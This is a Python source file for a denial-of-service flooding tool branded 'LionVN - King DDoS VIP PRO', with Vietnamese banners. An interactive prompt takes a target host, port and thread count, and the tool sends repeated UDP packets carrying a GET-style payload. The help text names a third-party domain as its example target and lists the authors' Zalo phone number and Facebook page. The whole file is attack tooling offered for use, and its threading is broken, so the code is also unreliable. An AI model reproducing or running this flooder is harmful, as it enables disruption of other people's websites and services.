import os
import socket
import string
import random
import threading
from colorama import Fore, Back, Style

class SockFlood:
	def __init__(self):
		os.system("cls")
		os.system("title LionVN - King DDoS VIP PRO ")
		self.host=None
		self.portnum=None
		self.threads=None

	def graphics(self):
		banner="""
		
		
		
		
		
		
		Copyright By : Team Lion VN - LionV5 (Beta)

		Ngày Ra Mắt Tool - 30.8.2022 (LionV5)
		"""
		print(Fore.RED+banner)
		print(Fore.YELLOW+"""
		Lion Team Hello Member"""+Fore.GREEN+"""
		Lion V5 Đỉnh Cao DDOS""")
		print(Fore.WHITE+"""
		[LION] Sử Dụng Lệnh "help" Để Xem Cách Sử Dụng [LION]
			""")

	def start_attack(self,host,port=None):
		self.sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
		try:
			url_path=str(string.ascii_letters + string.digits + string.punctuation)
			byt = (f"GET /{url_path} HTTP/1.1\nHost: {host}\n\n").encode()
			if not port:
				self.sock.sendto(byt,(host,80))
			elif port:
				self.sock.sendto(byt,(host,int(port)))
			print(Fore.WHITE+"""[LionVN] DDoS Thành Công <3""")
		except Exception as e:
			print(Fore.RED+f"""
	[404] Lỗi Vui Lòng Thử Lại
	[-] EXCEPTION : {e}
						""")

	def command_parser(self,command):
		if command=="help":
			print(Fore.WHITE+"""
	Lion V5 DDoS Pro 
 
	(LIONVN) Zalo : 0792161421 
	(LIONVN) Facebook : https://www.facebook.com/Team.Lion.vn/
	(LIONVN) host nhatquyenit.net (enter) - port 443 or 80 (enter) - attacks 10000 (enter) - start (enter)
	""")
		if "host " in command:
			self.host=command.replace("host ","").replace("https://", "").replace("http://", "").replace("www.", "")
			print(Fore.WHITE+f"""
	[VietNam] Thêm Host Done {self.host}
				""")
		elif "port " in command:
			self.portnum=command.replace("port ","")
			print(Fore.WHITE+f"""
	[VietNam] Thêm Port Done {self.portnum}
				""")
		elif command=="start":
			print(self.portnum)
			if self.host and self.portnum:
				if int(self.threads):
					for i in range(1,int(self.threads)):
						threading.Thread(target=self.start_attack(self.host,self.portnum)).start()
				else:
					for i in range(1,1000):
						threading.Thread(target=self.start_attack(self.host,self.portnum)).start()
			elif self.host and not self.portnum:
				if int(self.threads):
					for i in range(1,int(self.threads)):
						threading.Thread(target=self.start_attack(self.host)).start()
				else:
					for i in range(1,1000):
						threading.Thread(target=self.start_attack(self.host)).start()
		elif "attacks " in command:
			self.threads=command.replace("attacks ","")
			print(Fore.WHITE+f"""
	[VietNam] Thêm attacks Done {self.threads}
				""")

	def run(self):
		self.graphics()
		while True:
			self.command_parser(input(Fore.CYAN+f"${os.environ.get('USERNAME')}$>> "))

if __name__=="__main__":
	app=SockFlood()
	app.run()